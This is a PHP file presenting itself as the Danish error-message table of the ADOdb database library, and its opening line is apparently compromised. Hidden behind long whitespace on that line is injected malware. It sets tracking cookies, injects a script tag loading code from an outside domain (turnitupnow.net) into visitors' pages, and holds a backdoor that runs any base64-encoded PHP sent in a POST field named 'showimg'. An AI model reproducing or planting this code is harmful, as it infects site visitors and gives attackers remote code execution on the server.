<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Arne Eckmann bananstat#users.sourceforge.net
$ADODB_LANG_ARRAY = array (
  	    'LANG'                      => 'da',
            DB_ERROR                    => 'ukendt fejl',
            DB_ERROR_ALREADY_EXISTS     => 'eksisterer allerede',
            DB_ERROR_CANNOT_CREATE      => 'kan ikke oprette',
            DB_ERROR_CANNOT_DELETE      => 'kan ikke slette',
            DB_ERROR_CANNOT_DROP        => 'kan ikke droppe',
            DB_ERROR_CONSTRAINT         => 'begr&aelig;nsning kr&aelig;nket',
            DB_ERROR_DIVZERO            => 'division med nul',
            DB_ERROR_INVALID            => 'ugyldig',
            DB_ERROR_INVALID_DATE       => 'ugyldig dato eller klokkeslet',
            DB_ERROR_INVALID_NUMBER     => 'ugyldigt tal',
            DB_ERROR_MISMATCH           => 'mismatch',
            DB_ERROR_NODBSELECTED       => 'ingen database valgt',
            DB_ERROR_NOSUCHFIELD        => 'felt findes ikke',
            DB_ERROR_NOSUCHTABLE        => 'tabel findes ikke',
            DB_ERROR_NOT_CAPABLE        => 'DB backend opgav',
            DB_ERROR_NOT_FOUND          => 'ikke fundet',
            DB_ERROR_NOT_LOCKED         => 'ikke l&aring;st',
            DB_ERROR_SYNTAX             => 'syntaksfejl',
            DB_ERROR_UNSUPPORTED        => 'ikke underst&oslash;ttet',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'resulterende antal felter svarer ikke til foresp&oslash;rgslens antal felter',
            DB_ERROR_INVALID_DSN        => 'ugyldig DSN',
            DB_ERROR_CONNECT_FAILED     => 'tilslutning mislykkedes',
            0	                        => 'ingen fejl', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'utilstr&aelig;kkelige data angivet',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'udvidelse ikke fundet',
            DB_ERROR_NOSUCHDB           => 'database ikke fundet',
            DB_ERROR_ACCESS_VIOLATION   => 'utilstr&aelig;kkelige rettigheder'
);
?>